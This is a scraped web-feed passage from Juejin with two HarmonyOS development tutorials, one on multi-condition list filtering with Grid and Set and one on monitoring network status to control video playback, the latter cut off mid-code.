                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>本示例主要介绍多重筛选场景，利用数组方法过滤满足条件的数据，利用LazyForEach实现列表信息的渲染以及刷新。</p>
<h3 data-id="heading-1">效果图预览</h3>
<p><img src="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtybbs/753/188/655/0030086000753188655.20250208170657.45072066443077240724526669292193:50001231000000:2800:E671446133558720AB6FB68352808B527C99ACCA7BEC5851B8E80FE36378212B.gif" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>等待列表数据全部加载完成后，点击筛选类型，展开筛选数据。</li>
<li>选中想要筛选的数据，点击确认，列表刷新。</li>
<li>再次点开筛选类型，保留上次筛选的内容，点击重置筛选内容复原，列表数据恢复为未筛选前的数据。</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<p>本例涉及的关键特性和实现方案如下：</p>
<ol>
<li>
<p>使用Grid实现筛选条件布局。</p>
<p>Grid() {
ForEach(this.item.options, (options: string, idx: number) =&gt; {
GridItem() {
Text(options)
.textAlign(TextAlign.Center)
.fontSize(16)
.height(40)
.width('100%')
}
...
})
}
.columnsTemplate('1fr 1fr 1fr')
.rowsGap(16)
.columnsGap(16)
.margin({
left: 16,
right: 6,
top: 8,
bottom: 8
})
.layoutDirection(GridDirection.Row)
.constraintSize({
minHeight: '15%',
maxHeight: '15%'// grid会撑满maxHeight，先限定死高度
})</p>
</li>
<li>
<p>使用数组方法对筛选数据进行过滤，得到筛选数据。</p>
<p>GridItem() {
Text(options)
.textAlign(TextAlign.Center)
.fontSize(16)
.height(40)
.width('100%')
}
.onClick(() =&gt; {
if (this.item.selectItem.includes(idx)) {
let index = this.item.selectItem.indexOf(idx);
let listIdx = this.changData.indexOf(options);
// 删除已存在的筛选数据的index值
this.item.selectItem.splice(index, 1);
// 过滤出来没有重复数据的筛选值
this.changData = this.changData.filter(i =&gt; i !== options);
this.selectArr = this.item.selectItem;
// 删除已选择的数据的行数index数组
this.arrayListData.splice(listIdx, 1);
} else {
// 添加筛选数据的index值
this.item.selectItem.push(idx);
// 添加选中的数据
this.changData.push(options);
this.selectArr = this.item.selectItem;
// 添加选择的数据的行数index数组
this.arrayListData.push(this.listIndex);
}
})</p>
</li>
<li>
<p>得到筛选的数据后根据点击的筛选数据行数，使用has进行if判断看是否满足多重筛选的条件。</p>
<p>Button('确认')
.height(40)
.width(150)
.backgroundColor(Color.White)
.fontColor('#333')
.onClick(() =&gt; {
this.isShow = false;
let arrayListData = new Set(this.arrayListData)
if (arrayListData.has(0) &amp;&amp; !arrayListData.has(1)) {
// 仅选择停放时间
this.siteList.timeMultiFilter(this.changData);
} else if (!arrayListData.has(0) &amp;&amp; arrayListData.has(1)) {
// 仅选择套餐类型
this.siteList.typeMultiFilter(this.changData);
} else if (!arrayListData.has(0) &amp;&amp; !arrayListData.has(1) &amp;&amp; arrayListData.has(2)) {
// 仅选择充电
this.siteList.getInitalList();
} else if (this.changData.length === 0) {
// 未对数据进行选择
this.siteList.getInitalList();
} else {
// 多重筛选
this.siteList.multiFilter(this.changData);
}
if (this.siteList.totalCount() === 0) {
this.siteList.getInitalList();
promptAction.showToast({ message: "未找到相关数据" });
}
})</p>
</li>
<li>
<p>使用filter过滤出来符合条件的数据，筛选出来的数组构建一个新的Set，使用Set中的has判断列表中相关数据是否存在。</p>
<p>public multiFilter(changData: Array) {
let siteListString: string | undefined = AppStorage.get('siteList')
if (siteListString) {
let siteListObject: SiteListDataSource | undefined = JSON.parse(siteListString)
if (siteListObject === undefined) {
return
}
this.initialSiteList = siteListObject.dataList
this.dataList = []
this.dataList = this.initialSiteList
// 筛选数据
let changDataSet = new Set(changData)
let dataList: SiteItem[] = this.dataList.filter(item =&gt; {
item.siteBale = item.siteBale.filter(item =&gt; {
if ((item.time &amp;&amp; item.type) &amp;&amp; (changDataSet.has(item.time)) &amp;&amp; (changDataSet.has(item.type))) {
return item
}
return
})
return item.siteBale
})
dataList = dataList.filter(item =&gt; item.siteBale.length !== 0);
this.dataList = [];
this.dataList = dataList;
this.notifyDataReload();
}
}</p>
</li>
<li>
<p>使用深拷贝保留原数据。</p>
<p>/**</p>
<ul>
<li>返回原数组
*/
public getInitalList() {
let siteListString: string | undefined = AppStorage.get('siteList');
if (siteListString) {
let siteListObject: SiteListDataSource | undefined = JSON.parse(siteListString);
if (siteListObject === undefined) {
return;
}
this.initialSiteList = siteListObject.dataList;
this.dataList = [];
this.dataList = this.initialSiteList;
this.notifyDataReload();
}
}</li>
</ul>
</li>
</ol>
<h4 data-id="heading-3">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-4">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca96e9337cad4238838c1d0b17c43d3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622430&amp;x-signature=ZFj%2Fgf574NJle2PNbBNMEy%2FBffI%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：网络状态监听]]></title>    <link>https://juejin.cn/post/7589201772118114310</link>    <guid>https://juejin.cn/post/7589201772118114310</guid>    <pubDate>2025-12-29T14:16:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772118114310" data-draft-id="7589126217250865193" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：网络状态监听"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:16:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：网络状态监听
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:16:51.000Z" title="Mon Dec 29 2025 14:16:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>本示例介绍如何使用<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V13%2Fjs-apis-net-connection-V13%3FcatalogVersion%3DV13" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V13/js-apis-net-connection-V13?catalogVersion=V13" ref="nofollow noopener noreferrer">@kit.NetworkKit</a>接口监听手机网络状态，根据不同的网络状态对视频进行播放、暂停处理等操作。</p>
<h3 data-id="heading-1">效果预览图</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d4ed1a1faba4e1090963262cfa22bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622611&amp;x-signature=sNS9z4iq0Wj61mWq28UvHh2svt8%3D" alt="" loading="lazy"/></p>
<p><strong>使用说明</strong></p>
<ol>
<li>第一次打开应用进入案例页面，视频不播放。</li>
<li>点击自动播放设置按钮，进入设置页面，开启或者关闭3G/4G/5G自动播放、WI-FI自动播放。</li>
<li>开启或者关闭手机的蜂窝网络或者WI-FI开关，查看视频是否根据自动播放设置页面中的设置播放或者暂停。</li>
<li>返回首页瀑布流或者杀死应用重新进入案例，查看视频是否根据自动播放设置中的设置和手机网络状态播放或者暂停。</li>
</ol>
<h3 data-id="heading-2">实现思路</h3>
<ol>
<li>
<p>页面实现</p>
<p>1.1 在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fharmonyos-cases%2Fcases%2Ftree%2Fmaster%2FCommonAppDevelopment%2Ffeature%2Fnetworkstatusobserver%2Fsrc%2Fmain%2Fets%2Fpages%2FVideoPage.ets" target="_blank" title="https://gitee.com/harmonyos-cases/cases/tree/master/CommonAppDevelopment/feature/networkstatusobserver/src/main/ets/pages/VideoPage.ets" ref="nofollow noopener noreferrer">VideoPage</a>中添加Video组件，设置在线视频播放</p>
<pre><code class="hljs language-kotlin" lang="kotlin">```
Video({
  src: <span class="hljs-string">"https://v.oh4k.com/muhou/2022/07/20220704-RIUq3Z.mp4"</span>,
   controller: <span class="hljs-keyword">this</span>.controller
}).height(<span class="hljs-number">300</span>)
  .width(<span class="hljs-string">'100%'</span>)
  .autoPlay(<span class="hljs-keyword">this</span>.autoPlay())
```
</code></pre>
<p>1.2 在aboutToAppear方法中添加网络状态监听，并开始监听WI-FI和蜂窝数据的状态。</p>
<pre><code class="hljs language-scss" lang="scss">```
emitter<span class="hljs-selector-class">.on</span>(NetUtils.getInstance()<span class="hljs-selector-class">.getEmitterEvent</span>(), (data: emitter.EventData) =&gt; {
  if (data) {
    this<span class="hljs-selector-class">.netObserver</span>(data);
  } else {
    logger<span class="hljs-selector-class">.info</span>("aboutToAppear emitter on error, data is undefined.");
  }
});
NetUtils<span class="hljs-selector-class">.getInstance</span>()<span class="hljs-selector-class">.startNetObserve</span>(connection.NetBearType.BEARER_CELLULAR, connection.NetBearType.BEARER_WIFI);
```
</code></pre>
<p>1.3 在netObserver方法中，添加不同网络状态的处理。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">netObserver(<span class="hljs-keyword">data</span>: emitter.EventData) {
...
  let eventName: NetworkEventName = netEventData.eventName ?? -<span class="hljs-number">1</span>;
  switch (eventName) {
    case NetworkEventName.NetAvailable:
      <span class="hljs-keyword">if</span> (netEventData.netType === connection.NetBearType.BEARER_WIFI) {
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.wifiAutoPlay) {
          <span class="hljs-keyword">this</span>.startPlay();
        }
      }
      <span class="hljs-keyword">break</span>;
    case NetworkEventName.NetBlock:
      <span class="hljs-keyword">break</span>;
    case NetworkEventName.NetLost:
      <span class="hljs-keyword">if</span> (netEventData.netType === connection.NetBearType.BEARER_WIFI) {
        <span class="hljs-keyword">this</span>.wifiInterrupt();
      }
      <span class="hljs-keyword">break</span>;
    case NetworkEventName.NetUnavailable:
      <span class="hljs-keyword">if</span> (netEventData.netType === connection.NetBearType.BEARER_WIFI) {
        <span class="hljs-keyword">this</span>.wifiInterrupt();
      }
      <span class="hljs-keyword">break</span>;
    case NetworkEventName.WeakNet:
      <span class="hljs-comment">// 如果是弱网环境</span>
      <span class="hljs-keyword">if</span> (netEventData.status) {
        Prompt.showToast({ message: <span class="hljs-string">"当前网络环境较差，视频播放可能出现卡顿"</span> });
      }
      <span class="hljs-keyword">break</span>;
    default:
      logger.debug(<span class="hljs-string">"当前网络状态："</span> + eventName);
      <span class="hljs-keyword">break</span>;
  }
}
</code></pre>
<p>1.4 在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fharmonyos-cases%2Fcases%2Ftree%2Fmaster%2FCommonAppDevelopment%2Ffeature%2Fnetworkstatusobserver%2Fsrc%2Fmain%2Fets%2Fpages%2FSettingPage.ets" target="_blank" title="https://gitee.com/harmonyos-cases/cases/tree/master/CommonAppDevelopment/feature/networkstatusobserver/src/main/ets/pages/SettingPage.ets" ref="nofollow noopener noreferrer">SettingPage</a>中添加Toggle组件，管理自动播放设置。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title function_ invoke__">Toggle</span>({ <span class="hljs-attr">type</span>: ToggleType.Switch, <span class="hljs-attr">isOn</span>: this.cellularAutoPlay })
  .<span class="hljs-title function_ invoke__">selectedColor</span>(<span class="hljs-string">'#007DFF'</span>)
  .<span class="hljs-title function_ invoke__">switchPointColor</span>(<span class="hljs-string">'#FFFFFF'</span>)
  .<span class="hljs-title function_ invoke__">onChange</span>((<span class="hljs-attr">isOn</span>: <span class="hljs-keyword">boolean</span>) =&gt; {
    logger.<span class="hljs-title function_ invoke__">info</span>(<span class="hljs-string">'Component status:'</span> + isOn);
    AppStorage.<span class="hljs-title function_ invoke__">setOrCreate</span>(<span class="hljs-string">'cellular_auto_play'</span>, isOn);
    PersistentStorage.<span class="hljs-title function_ invoke__">persistProp</span>(<span class="hljs-string">'cellular_auto_play'</span>, isOn);
  })
  .<span class="hljs-title function_ invoke__">width</span>(<span class="hljs-string">'10%'</span>)
</code></pre>
</li>
<li>
<p>网络状态监听工具类<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fharmonyos-cases%2Fcases%2Ftree%2Fmaster%2FCommonAppDevelopment%2Ffeature%2Fnetworkstatusobserver%2Fsrc%2Fmain%2Fets%2Futils%2FNetUtils.ets" target="_blank" title="https://gitee.com/harmonyos-cases/cases/tree/master/CommonAppDevelopment/feature/networkstatusobserver/src/main/ets/utils/NetUtils.ets" ref="nofollow noopener noreferrer">NetUtils</a>实现，通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Fdoc%2Fharmonyos-references-V5%2Fjs-apis-net-connection-V5" target="_blank" title="https://developer.huawei.com/consumer/cn/doc/harmonyos-references-V5/js-apis-net-connection-V5" ref="nofollow noopener noreferrer">@kit.NetworkKit</a>接口监听网络状态，然后通过emitter将监听结果传递给页面。</p>
<p>2.1 开启网络监听</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-title function_">startNetObserve</span>(<span class="hljs-params">...netType: connection.NetBearType[]</span>) {
  netType.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-keyword">type</span>: connection.NetBearType</span>) =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">networkObserve</span>(<span class="hljs-keyword">type</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">type</span> === connection.<span class="hljs-property">NetBearType</span>.<span class="hljs-property">BEARER_WIFI</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">wifiStateObserve</span>();
    }
  })
}
</code></pre>
<p>2.2 关闭网络监听</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-title function_">stopNetObserve</span>(<span class="hljs-params">netType: connection.NetBearType</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">connectionMap</span>.<span class="hljs-title function_">get</span>(netType).<span class="hljs-title function_">unregister</span>(<span class="hljs-function">() =&gt;</span> {
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"Success unregister："</span> + netType.<span class="hljs-title function_">toString</span>());
  })
}
</code></pre>
<p>2.3 网络状态监听</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">networkObserve</span>(<span class="hljs-params">netType: connection.NetBearType</span>) {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">netConnection</span>: connection.<span class="hljs-property">NetConnection</span> = connection.<span class="hljs-title function_">createNetConnection</span>({
    <span class="hljs-attr">netCapabilities</span>: {
      <span class="hljs-attr">bearerTypes</span>: [netType]
    }
  })
  netConnection.<span class="hljs-title function_">register</span>(<span class="hljs-function">(<span class="hljs-params">error: BusinessError</span>) =&gt;</span> {
    <span class="hljs-keyword">let</span> result = <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">if</span> (error) {
      logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network register failed: "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(error));
      result = <span class="hljs-literal">false</span>;
    }
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network register succeed"</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetObserverRegister</span>, result, netType);
  });

  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">'netCapabilitiesChange'</span>, <span class="hljs-function">(<span class="hljs-params">data: connection.NetCapabilityInfo</span>) =&gt;</span> {
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network netCapabilitiesChange: "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetCapabilitiesChange</span>, data, netType);
  })

  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">"netAvailable"</span>, <span class="hljs-function">(<span class="hljs-params">data: connection.NetHandle</span>) =&gt;</span> {
    logger.<span class="hljs-title function_">info</span>(<span class="hljs-string">"NetUtils"</span>, <span class="hljs-string">"NetType :"</span> + netType + <span class="hljs-string">", network succeeded to get netAvailable: "</span> + <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
    <span class="hljs-comment">// 检查默认数据网络是否被激活，使用同步方式返回接口，如果被激活则返回true，否则返回false。</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">postEvent</span>(<span class="hljs-title class_">NetworkEventName</span>.<span class="hljs-property">NetAvailable</span>, connection.<span class="hljs-title function_">hasDefaultNetSync</span>(), netType);
  });
 
  <span class="hljs-comment">// 订阅网络阻塞状态事件，当网络阻塞时，如网络性能下降、数据传输出现延迟等情况时，会触发该事件</span>
  netConnection.<span class="hljs-title function_">on</span>(<span class="hljs-string">'netBlockStatusChange'</span>, <span class="hljs-function">(<span class="hljs-params">data: connection.NetBlockStatusInfo</span>) =&gt;</span> {
